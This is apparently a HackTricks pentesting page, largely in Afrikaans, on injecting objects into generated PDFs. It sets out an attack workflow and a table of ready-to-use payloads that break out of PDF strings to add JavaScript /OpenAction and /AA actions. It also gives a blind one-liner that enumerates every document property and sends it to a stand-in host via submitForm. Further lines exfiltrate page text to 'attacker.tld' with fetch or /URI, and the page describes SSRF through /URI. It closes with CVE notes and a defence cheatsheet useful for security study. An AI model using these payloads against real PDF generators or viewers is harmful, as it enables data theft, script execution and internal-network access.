# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**As jou invoer in 'n PDF-lêer weerspieël word, kan jy probeer om PDF-data in te voeg om JavaScript uit te voer, SSRF uit te voer of die PDF-inhoud te steel.**
PDF-sintaksis is uiters permissief – as jy uit die string of dictionary kan breek wat jou invoer inkapsel, kan jy heeltemal nuwe objects byvoeg (of nuwe keys in dieselfde object) wat Acrobat/Chrome vrolik sal parse.
Sedert 2024 het 'n golf bug-bounty-verslae getoon dat *een unescaped parenthesis of back-slash genoeg is* vir volledige skripuitvoering.

## TL;DR – Moderne Aanvalswerkvloeistroom (2024-2026)
1. Vind enige deur die gebruiker beheerde waarde wat eindig binne 'n **(parenthesis string)**, `/URI ( … )` of `/JS ( … )` veld in die gegenereerde PDF.
2. Invoeg `) ` (sluit die string) gevolg deur een van die primitiewe hieronder en eindig met nog 'n oop parenthesis om die sintaks geldig te hou.
3. Lewer die kwaadwillige PDF aan 'n slagoffer (of aan 'n backend-diens wat die lêer outomaties render – ideaal vir blind bugs).
4. Jou payload word in die PDF-viewer uitgevoer:
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (see CVE-2024-4367)
* Acrobat → Full JavaScript API (can exfiltrate arbitrary file contents with `this.getPageNthWord`)

Example (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*Die eerste `)` maak die oorspronklike URI-string toe, dan voeg ons 'n nuwe **Action** woordeboek by wat Acrobat sal uitvoer wanneer die gebruiker op die skakel klik.*

## Nuttige Injection Primitives
| Goal | Payload Snippet | Notes |
|------|-----------------|-------|
| **JavaScript by oopmaak** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Voer onmiddellik uit wanneer die dokument oopgemaak word (werk in Acrobat, nie in Chrome nie). |
| **JavaScript by skakel** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Werk in PDFium & Acrobat as jy ` /Link` annotasie beheer. |
| **Blind data-exfiltrasie** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | Kombineer met `this.getPageNthWord` binne JS om inhoud te steel. |
| **Server-side SSRF** | Same as above but target an internal URL – great when the PDF is rendered by back-office services that honour `/URI`. |
| **Aanvullende Actions (/AA)** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | Koppel aan 'n Page/Annotation/Form woordeboek om op oopmaak/fokus uit te voer. |
| **Line Break for new objects** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | As die library jou toelaat om reëlbreek-karakters in te voeg, kan jy heeltemal nuwe objekte skep. |

## Ingeslote Actions as Injection Targets
PDF-viewers behandel **ingeslote actions** soos `/OpenAction` en `/AA` (Additional Actions) as eersteklas funksies wat uitgevoer kan word wanneer 'n dokument oopmaak of wanneer 'n spesifieke gebeurtenis plaasvind. As jy in enige woordeboek kan invoeg wat actions aanvaar (Catalog, Page, Annotation, of Form field), kan jy 'n `/AA`-boom aanheg en JavaScript by oopmaak/fokus aktiveer.

Example payload for **generator-side object injection** (close the original string/dictionary and inject `/AA`):
```pdf
) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
```
Hierdie patroon ooreenstem met onlangse jsPDF-kwessies waar aanvaller-beheerde inset wat aan `addJS` (of sekere AcroForm-velde) deurgegee word, uitbreek uit die bedoelde JavaScript-string en 'n **Additional Action**-woordeboek injekteer.

## Blind Enumerasie-truuk
Gareth Heyes (PortSwigger) het 'n eenreël-oplossing vrygestel wat elke objek binne 'n onbekende dokument enumeriseer – handig wanneer jy die gegenereerde PDF nie kan sien:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
Die kode iterereer oor die Acrobat DOM en maak uitgaande versoeke vir elke eienskap/waarde-paar, wat jou 'n *JSON-ish* dump van die lêer gee.
Sien die white-paper “Portable Data **ex**Filtration” vir die volledige tegniek.

## Werklike Wêreld Bugs (2023-2026)
* **CVE-2026-25755** – jsPDF `addJS` PDF object injection: deur 'n aanvaller beheerste stringe kan die JS-literal gesluit word en `/AA` → `/O` → `/JavaScript` aksies ingevoeg word wat by open/focus afgevuur word.
* **CVE-2024-4367** – Willekeurige JavaScript-uitvoering in Firefox se PDF.js voor 4.2.67 het die sandbox omseil met 'n gemanipuleerde `/JavaScript`-aksie.
* **Bug bounty 2024-05** – Groot fintech het kliënt-voorsien faktuurna notas toegelaat wat in `/URI` beland het; verslag is betaal $10k nadat 'n SSRF na 'n interne metadata-host gedemonstreer is met 'n `file:///` URI.
* **CVE-2023-26155** – `node-qpdf` command-injection via ongesaniteerde PDF-pad toon die belangrikheid van die ontsnapping van backslashes en parentheses selfs *voor* die PDF-laag.

## Verdedigings Cheatsheet
1. **Moet nooit rou gebruikersinvoer binne `(`…`)` strings of name saamvoeg nie.** Ontsnap `\`, `(`, `)` soos vereis deur §7.3 van die PDF-spesifikasie of gebruik hex strings `<...>`.
2. As jy skakels bou, verkies `/URI (https://…)` wat jy *volledig* URL-enkodeer; blokkeer `javascript:` skemas in client-viewers.
3. Verwyder of valideer `/OpenAction`, `/AA` (additional actions), `/Launch`, `/SubmitForm` en `/ImportData` dictionaries wanneer jy PDFs na-verwerk.
4. Aan die bedienerkant, render onbetroubare PDFs met 'n *headless converter* (e.g. qpdf –decrypt –linearize) wat JavaScript en eksterne aksies verwyder.
5. Hou PDF-viewers op datum; PDF.js < 4.2.67 en Acrobat Reader voor die Julie 2024-patches laat triviale kode-uitvoering toe.
6. As jy client-side generators gebruik (e.g., jsPDF), moenie onbetroubare insette deurgee aan `addJS` of AcroForm-setters wat in PDF action dictionaries beland nie.

## Verwysings
* Gareth Heyes, “Portable Data **ex**Filtration – XSS for PDFs”, PortSwigger Research (opgedateer Mei 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (Apr 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
* GitLab Advisory Database, “CVE-2026-25755: jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method” (Feb 2026). <https://advisories.gitlab.com/pkg/npm/jspdf/CVE-2026-25755/>
* Adobe Acrobat Help, “Acrobat shows a warning message when signing documents” (Sep 2025) – ingesette aksies soos OpenAction/AA. <https://helpx.adobe.com/acrobat/kb/embedded-action-signing-warning.html>
{{#include ../../banners/hacktricks-training.md}}
